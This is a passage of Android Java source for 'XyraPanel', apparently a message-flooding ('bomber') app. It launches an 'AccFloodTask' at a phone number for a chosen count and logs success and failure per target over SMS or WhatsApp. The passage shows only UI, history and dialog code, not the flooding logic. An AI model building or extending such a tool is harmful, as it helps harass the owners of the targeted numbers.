            jumlah = Integer.parseInt(jumlahStr);
        } catch (NumberFormatException e) {
            Toast.makeText(this, "Jumlah tidak valid", Toast.LENGTH_SHORT).show();
            return;
        }
        
        if (jumlah < 1 || jumlah > MAX_SEND) {
            Toast.makeText(this, "Jumlah harus antara 1-" + MAX_SEND, Toast.LENGTH_SHORT).show();
            return;
        }
        
        if (!isNetworkAvailable()) {
            Toast.makeText(this, "Tidak ada koneksi internet", Toast.LENGTH_SHORT).show();
            return;
        }
        
        InputMethodManager imm = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
        if (imm != null && getCurrentFocus() != null) {
            imm.hideSoftInputFromWindow(getCurrentFocus().getWindowToken(), 0);
        }
        
        failureList.clear();
        updateFailureIcon();
        
        progressBar.setVisibility(View.VISIBLE);
        progressBar.setProgress(0);
        enableQuickButtons(false);
        
        currentTask = new AccFloodTask();
        currentTask.execute(phone, jumlahStr);
    }
    
    private void saveHistory(String phone, int success, int failed, String provider) {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        String historyJson = prefs.getString(KEY_HISTORY, "[]");
        
        try {
            JSONArray historyArray = new JSONArray(historyJson);
            
            JSONObject entry = new JSONObject();
            entry.put("phone", phone);
            entry.put("success", success);
            entry.put("failed", failed);
            entry.put("provider", provider);
            entry.put("time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
            
            historyArray.put(entry);
            
            while (historyArray.length() > 50) {
                historyArray.remove(0);
            }
            
            prefs.edit().putString(KEY_HISTORY, historyArray.toString()).apply();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void showHistoryDialog() {
        final Dialog dialog = new Dialog(this);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.setContentView(R.layout.dialog_history);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.setCancelable(true);
        
        // Set dialog width to 90% of screen width
        WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
        lp.copyFrom(dialog.getWindow().getAttributes());
        lp.width = (int) (getResources().getDisplayMetrics().widthPixels * 0.9);
        lp.height = WindowManager.LayoutParams.WRAP_CONTENT;
        
        final LinearLayout layoutItems = (LinearLayout) dialog.findViewById(R.id.layout_history_items);
        Button btnClear = (Button) dialog.findViewById(R.id.btn_clear_history);
        Button btnClose = (Button) dialog.findViewById(R.id.btn_close_history);
        
        final SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        String historyJson = prefs.getString(KEY_HISTORY, "[]");
        
        try {
            JSONArray historyArray = new JSONArray(historyJson);
            
            if (historyArray.length() == 0) {
                LinearLayout emptyLayout = new LinearLayout(this);
                emptyLayout.setOrientation(LinearLayout.VERTICAL);
                emptyLayout.setGravity(Gravity.CENTER);
                emptyLayout.setPadding(0, 60, 0, 60);
                
                TextView emptyIcon = new TextView(this);
                emptyIcon.setText("📋");
                emptyIcon.setTextSize(36);
                emptyIcon.setGravity(Gravity.CENTER);
                
                TextView emptyText = new TextView(this);
                emptyText.setText("Belum ada riwayat pengiriman");
                emptyText.setTextColor(getResources().getColor(R.color.textSecondary));
                emptyText.setTextSize(14);
                emptyText.setGravity(Gravity.CENTER);
                emptyText.setPadding(0, 12, 0, 0);
                
                emptyLayout.addView(emptyIcon);
                emptyLayout.addView(emptyText);
                layoutItems.addView(emptyLayout);
            } else {
                for (int i = historyArray.length() - 1; i >= 0; i--) {
                    JSONObject entry = historyArray.getJSONObject(i);
                    
                    LinearLayout itemLayout = new LinearLayout(this);
                    itemLayout.setOrientation(LinearLayout.HORIZONTAL);
                    itemLayout.setPadding(12, 14, 12, 14);
                    itemLayout.setGravity(Gravity.CENTER_VERTICAL);
                    
                    String provider = entry.optString("provider", "sms").toUpperCase();
                    int successCount = entry.getInt("success");
                    int failedCount = entry.getInt("failed");
                    
                    TextView tvProviderBadge = new TextView(this);
                    tvProviderBadge.setText(provider);
                    tvProviderBadge.setTextColor(provider.equals("SMS") ? getResources().getColor(R.color.iosBlue) : getResources().getColor(R.color.iosGreen));
                    tvProviderBadge.setTextSize(10);
                    tvProviderBadge.setPadding(12, 6, 12, 6);
                    tvProviderBadge.setBackgroundResource(R.drawable.chip_unselected);
                    
                    LinearLayout infoLayout = new LinearLayout(this);
                    infoLayout.setOrientation(LinearLayout.VERTICAL);
                    infoLayout.setPadding(14, 0, 0, 0);
                    LinearLayout.LayoutParams infoParams = new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
                    infoLayout.setLayoutParams(infoParams);
                    
                    TextView tvPhone = new TextView(this);
                    tvPhone.setText(entry.getString("phone"));
                    tvPhone.setTextColor(getResources().getColor(R.color.textPrimary));
                    tvPhone.setTextSize(15);
                    tvPhone.setTypeface(null, android.graphics.Typeface.BOLD);
                    
                    TextView tvStats = new TextView(this);
                    tvStats.setText("✓ " + successCount + "  ✗ " + failedCount);
                    tvStats.setTextColor(getResources().getColor(R.color.textSecondary));
                    tvStats.setTextSize(12);
                    tvStats.setPadding(0, 4, 0, 0);
                    
                    infoLayout.addView(tvPhone);
                    infoLayout.addView(tvStats);
                    
                    TextView tvTime = new TextView(this);
                    tvTime.setText(entry.getString("time"));
                    tvTime.setTextColor(getResources().getColor(R.color.textTertiary));
                    tvTime.setTextSize(11);
                    
                    itemLayout.addView(tvProviderBadge);
                    itemLayout.addView(infoLayout);
                    itemLayout.addView(tvTime);
                    
                    layoutItems.addView(itemLayout);
                    
                    if (i > 0) {
                        View divider = new View(this);
                        divider.setBackgroundColor(getResources().getColor(R.color.divider));
                        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(
                            LinearLayout.LayoutParams.MATCH_PARENT, 1);
                        params.setMargins(12, 0, 12, 0);
                        divider.setLayoutParams(params);
                        layoutItems.addView(divider);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        btnClear.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                prefs.edit().putString(KEY_HISTORY, "[]").apply();
                dialog.dismiss();
                Toast.makeText(MainActivity.this, "Riwayat dihapus", Toast.LENGTH_SHORT).show();
            }
        });
        
        btnClose.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                dialog.dismiss();
            }
        });
        
        dialog.show();
        dialog.getWindow().setAttributes(lp);
    }
    
    private void showAboutDialog() {
        final Dialog dialog = new Dialog(this);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.setContentView(R.layout.dialog_about);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.setCancelable(true);
        
        // Set dialog width to 90% of screen width
        WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
        lp.copyFrom(dialog.getWindow().getAttributes());
        lp.width = (int) (getResources().getDisplayMetrics().widthPixels * 0.9);
        lp.height = WindowManager.LayoutParams.WRAP_CONTENT;
        
        Button btnClose = (Button) dialog.findViewById(R.id.btn_close_about);
        Button btnReport = (Button) dialog.findViewById(R.id.btn_report_problem);
        Button btnContactEmail = (Button) dialog.findViewById(R.id.btn_contact_email);
        Button btnContactWa = (Button) dialog.findViewById(R.id.btn_contact_wa);
        
        btnClose.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                dialog.dismiss();
            }
        });
        
        if (btnReport != null) {
            btnReport.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    dialog.dismiss();
                    openReportProblem();
                }
            });
        }
        
        if (btnContactEmail != null) {
            btnContactEmail.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    Intent emailIntent = new Intent(Intent.ACTION_SENDTO);
                    emailIntent.setData(Uri.parse("mailto:xyraofficialsup@gmail.com"));
                    emailIntent.putExtra(Intent.EXTRA_SUBJECT, "XyraPanel - Inquiry");
                    try {
                        startActivity(Intent.createChooser(emailIntent, "Kirim Email"));
                    } catch (Exception e) {
                        Toast.makeText(MainActivity.this, "Tidak ada aplikasi email", Toast.LENGTH_SHORT).show();
                    }
                }
            });
        }
        
        if (btnContactWa != null) {
            btnContactWa.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    String phoneNumber = "62895325844493";
                    String message = "Halo, saya ingin bertanya tentang XyraPanel.";
                    try {
                        Intent waIntent = new Intent(Intent.ACTION_VIEW);
                        waIntent.setData(Uri.parse("https://wa.me/" + phoneNumber + "?text=" + Uri.encode(message)));
                        startActivity(waIntent);
                    } catch (Exception e) {
                        Toast.makeText(MainActivity.this, "WhatsApp tidak tersedia", Toast.LENGTH_SHORT).show();
                    }
                }
            });
        }
        
        dialog.show();
        dialog.getWindow().setAttributes(lp);
    }
    
    private void showPrivacyDialog() {
        final Dialog dialog = new Dialog(this);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.setContentView(R.layout.dialog_privacy);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.setCancelable(true);
        
        // Set dialog width to 90% of screen width
        WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
        lp.copyFrom(dialog.getWindow().getAttributes());
        lp.width = (int) (getResources().getDisplayMetrics().widthPixels * 0.9);
        lp.height = WindowManager.LayoutParams.WRAP_CONTENT;
        
        Button btnClose = (Button) dialog.findViewById(R.id.btn_close_privacy);
        
        if (btnClose != null) {
            btnClose.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    dialog.dismiss();
                }
            });
        }
        
        dialog.show();
        dialog.getWindow().setAttributes(lp);
    }
    
    private void checkPrivacyPolicy() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        boolean accepted = prefs.getBoolean(KEY_PRIVACY_ACCEPTED, false);
        
        if (!accepted) {
            showPrivacyAcceptDialog();
        }
    }
    
    private void showPrivacyAcceptDialog() {
        final Dialog dialog = new Dialog(this);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.setContentView(R.layout.dialog_privacy);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.setCancelable(false);
        
        // Set dialog width to 90% of screen width
        final WindowManager.LayoutParams lp = new WindowManager.LayoutParams();
        lp.copyFrom(dialog.getWindow().getAttributes());
        lp.width = (int) (getResources().getDisplayMetrics().widthPixels * 0.9);
        lp.height = WindowManager.LayoutParams.WRAP_CONTENT;
        
        final CheckBox cbAccept = (CheckBox) dialog.findViewById(R.id.cb_accept_privacy);
        final Button btnAccept = (Button) dialog.findViewById(R.id.btn_accept_privacy);
        Button btnClose = (Button) dialog.findViewById(R.id.btn_close_privacy);
        
        if (btnAccept != null) {
            btnAccept.setEnabled(false);
            btnAccept.setAlpha(0.5f);
        }
        
        if (cbAccept != null && btnAccept != null) {
            cbAccept.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
                @Override
                public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                    btnAccept.setEnabled(isChecked);
                    btnAccept.setAlpha(isChecked ? 1.0f : 0.5f);
                }
            });
            
            btnAccept.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                    prefs.edit().putBoolean(KEY_PRIVACY_ACCEPTED, true).apply();
                    dialog.dismiss();
                }
            });
        }
        
        if (btnClose != null) {
            btnClose.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    finish();
                }
            });
        }
        
        dialog.show();
        dialog.getWindow().setAttributes(lp);
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = "XyraPanel Notifications";
            String description = "Notifikasi status pengiriman";
            int importance = NotificationManager.IMPORTANCE_DEFAULT;
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, name, importance);
            channel.setDescription(description);
            
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            if (notificationManager != null) {
                notificationManager.createNotificationChannel(channel);
            }
        }
    }
    
    private void showNotification(String title, String content) {
        Intent intent = new Intent(this, MainActivity.class);
        intent.setAction(ACTION_SHOW_HISTORY);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        
        PendingIntent pendingIntent;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE);
        } else {
            pendingIntent = PendingIntent.getActivity(this, 0, intent, 0);
        }
        
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }
        
        builder.setSmallIcon(R.drawable.ic_launcher)
               .setContentTitle(title)
               .setContentText(content)
               .setContentIntent(pendingIntent)
               .setAutoCancel(true);
        
        NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (notificationManager != null) {
            notificationManager.notify(NOTIFICATION_ID, builder.build());
        }
    }
    
    private void handleNotificationIntent(Intent intent) {
        if (intent != null && ACTION_SHOW_HISTORY.equals(intent.getAction())) {
            showHistoryDialog();
        }
    }
    
    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        handleNotificationIntent(intent);
    }
}
